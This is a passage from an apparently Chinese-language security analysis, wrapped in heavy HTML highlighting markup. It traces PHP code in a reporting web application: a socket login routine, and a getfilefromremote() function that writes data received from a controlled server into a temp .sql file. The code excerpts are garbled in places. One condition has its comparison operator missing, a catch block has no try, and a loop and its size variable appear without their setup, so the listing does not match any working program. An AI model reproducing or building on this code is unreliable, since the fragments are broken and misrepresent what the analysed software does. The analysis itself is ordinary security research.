&nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendtags</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$recv</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;getstringfromserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$recv</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'_SUCCESS_'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">return</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">/* $_SESSION["username"]=$username;</span></p><p><span style="color: rgb(64, 96, 64); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $_SESSION["ip"]=$servername;</span></p><p><span style="color: rgb(64, 96, 64); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; header("location: data.php" );</span></p><p><span style="color: rgb(64, 96, 64); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(); */</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">else</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; disconnect</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; destroysession</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//return false;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>不同之处在于，它不需设置任何会话变量，只是简单的返回了套接字句柄。回到genratereports.php来看，在登录返回和套接字句柄验证之后，一些tag和string被发到受控服务端，之后，一个column name再从服务端发出。该column name是经验证，最终将在34行调用getfilefromremote()。我们决定再对getfilefromremote()进行一些深入分析，它具体功能代码位于config.php中：</p>
<p><span style="color: rgb(32, 96, 160); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(32, 96, 160); font-size: 13px;">function</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;getfilefromremote</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$uniqid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 128); font-size: 13px;">uniqid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$tag</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">readtag</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$tag</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(0, 128, 160); font-size: 13px;">5</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$msg</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$buf</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 128); font-size: 13px;">socket_read</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">4</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$rec_Data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">unpack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"N"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$buf</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$rec_Data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&gt;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//size</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$rec_Data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">socket_read</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$size</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$size</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$size</span><span style="color: rgb(0, 0, 0); font-size: 13px;">-</span><span style="color: rgb(0, 128, 128); font-size: 13px;">strlen</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data_rec</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;catch&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">Exception&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$e</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">echo</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'Caught exception: '</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$e</span><span style="color: rgb(0, 0, 0); font-size: 13px;">-&gt;</span><span style="color: rgb(0, 128, 255); font-size: 13px;">getMessage</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"<span style="color: rgb(192, 48, 48); font-size: 13px;">\n</span>"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">iconv</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'UTF-16LE'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'UTF-8'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data_rec</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$fp</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">fopen</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"temp/"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$uniqid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(192, 48, 48); font-size: 13px;">".sql"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"wb"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">fwrite</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$fp</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">fclose</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$fp</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 160); font-size: 13px;">2</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">socket_send</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">pack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'N*'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">strlen</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">pack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'N*'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$rec_ack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">readtag</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$rec_ack</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(0, 128, 160); font-size: 13px;">2</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//socket_close($sock);</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">return</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$uniqid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 